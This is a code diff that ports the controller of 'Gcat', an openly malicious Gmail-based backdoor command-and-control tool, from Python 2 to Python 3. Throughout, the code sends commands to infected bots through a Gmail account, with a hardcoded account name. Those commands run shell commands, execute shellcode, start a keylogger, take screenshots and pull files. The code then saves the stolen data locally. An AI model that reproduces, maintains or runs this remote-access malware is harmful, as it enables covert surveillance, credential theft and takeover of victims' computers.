@@ -13,10 +13,10 @@ from datetime import datetime
 from base64 import b64decode
 from smtplib import SMTP
 from argparse import RawTextHelpFormatter
-from email.MIMEMultipart import MIMEMultipart
-from email.MIMEBase import MIMEBase
-from email.MIMEText import MIMEText
-from email import Encoders
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email import encoders
 
 #######################################
 gmail_user = 'gcat.is.the.shit@gmail.com'
@@ -37,7 +37,7 @@ class msgparser:
         self.getDateHeader(msg_data)
 
     def getPayloads(self, msg_data):
-        for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
+        for payload in email.message_from_string(msg_data[1][0][1].decode("utf-8")).get_payload():
             if payload.get_content_maintype() == 'text':
                 self.text = payload.get_payload()
                 self.dict = json.loads(payload.get_payload())
@@ -46,10 +46,10 @@ class msgparser:
                 self.attachment = payload.get_payload()
 
     def getSubjectHeader(self, msg_data):
-        self.subject = email.message_from_string(msg_data[1][0][1])['Subject']
+        self.subject = email.message_from_string(msg_data[1][0][1].decode("utf-8"))['Subject']
 
     def getDateHeader(self, msg_data):
-        self.date = email.message_from_string(msg_data[1][0][1])['Date']
+        self.date = email.message_from_string(msg_data[1][0][1].decode("utf-8"))['Date']
 
 class Gcat:
 
@@ -75,18 +75,18 @@ class Gcat:
             if os.path.exists(attach) == True:  
                 part = MIMEBase('application', 'octet-stream')
                 part.set_payload(open(attach, 'rb').read())
-                Encoders.encode_base64(part)
+                encoders.encode_base64(part)
                 part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
                 msg.attach(part)
 
-        mailServer = SMTP()
+        mailServer = SMTP(host="smtp.gmail.com")
         mailServer.connect(server, server_port)
         mailServer.starttls()
         mailServer.login(gmail_user,gmail_pwd)
         mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
         mailServer.quit()
 
-        print "[*] Command sent successfully with jobid: {}".format(jobid)
+        print("[*] Command sent successfully with jobid: {}".format(jobid))
 
 
     def checkBots(self):
@@ -103,7 +103,7 @@ class Gcat:
                 if botid not in bots:
                     bots.append(botid)
                     
-                    print botid, msg.dict['sys']
+                    print(botid, msg.dict['sys'])
             
             except ValueError:
                 pass
@@ -120,11 +120,11 @@ class Gcat:
             msg_data = self.c.uid('fetch', idn, '(RFC822)')
             msg = msgparser(msg_data)
 
-            print "ID: " + botid
-            print "DATE: '{}'".format(msg.date)
-            print "OS: " + msg.dict['sys']
-            print "ADMIN: " + str(msg.dict['admin']) 
-            print "FG WINDOWS: '{}'\n".format(msg.dict['fgwindow'])
+            print("ID: " + botid)
+            print("DATE: '{}'".format(msg.date))
+            print("OS: " + msg.dict['sys'])
+            print("ADMIN: " + str(msg.dict['admin']))
+            print("FG WINDOWS: '{}'\n".format(msg.dict['fgwindow']))
 
     def getJobResults(self, botid, jobid):
 
@@ -138,12 +138,12 @@ class Gcat:
             msg_data = self.c.uid('fetch', idn, '(RFC822)')
             msg = msgparser(msg_data)
 
-            print "DATE: '{}'".format(msg.date)
-            print "JOBID: " + jobid
-            print "FG WINDOWS: '{}'".format(msg.dict['fgwindow'])
-            print "CMD: '{}'".format(msg.dict['msg']['cmd'])
-            print ''
-            print msg.dict['msg']['res'] + '\n'
+            print("DATE: '{}'".format(msg.date))
+            print("JOBID: " + jobid)
+            print("FG WINDOWS: '{}'".format(msg.dict['fgwindow']))
+            print("CMD: '{}'".format(msg.dict['msg']['cmd']))
+            print('')
+            print(msg.dict['msg']['res'] + '\n')
 
             if msg.attachment:
 
@@ -153,7 +153,7 @@ class Gcat:
                         image.write(b64decode(msg.attachment))
                         image.close()
 
-                    print "[*] Screenshot saved to ./data/" + imgname
+                    print("[*] Screenshot saved to ./data/" + imgname)
 
                 elif msg.dict['msg']['cmd'] == 'download':
                     filename = "{}-{}".format(botid, jobid)
@@ -161,7 +161,7 @@ class Gcat:
                         dfile.write(b64decode(msg.attachment))
                         dfile.close()
 
-                    print "[*] Downloaded file saved to ./data/" + filename
+                    print("[*] Downloaded file saved to ./data/" + filename)
 
     def logout():
         self.c.logout()
@@ -198,8 +198,7 @@ if __name__ == '__main__':
                      ...IM IN YUR COMPUTERZ...
 
                         WATCHIN YUR SCREENZ
-""",                                 
-                                     version='1.0.0',
+""",
                                      formatter_class=RawTextHelpFormatter,
                                      epilog='Meow!')
 
@@ -223,7 +222,7 @@ if __name__ == '__main__':
     slogopts.add_argument("-start-keylogger", dest='keylogger', action='store_true', help='Start keylogger')
     slogopts.add_argument("-stop-keylogger", dest='stopkeylogger', action='store_true', help='Stop keylogger')
     
-    if len(sys.argv) is 1:
+    if len(sys.argv) == 1:
         parser.print_help()
         sys.exit()
 
@@ -242,7 +241,7 @@ if __name__ == '__main__':
         gcat.sendEmail(args.id, jobid, 'cmd', args.cmd)
 
     elif args.shellcode:
-        gcat.sendEmail(args.id, jobid, 'execshellcode', args.shellcode.read().strip())
+        gcat.sendEmail(args.id, jobid, 'execshellcode', args.shellcode.read().strip().decode("utf-8"))
 
     elif args.download:
         gcat.sendEmail(args.id, jobid, 'download', r'{}'.format(args.download))
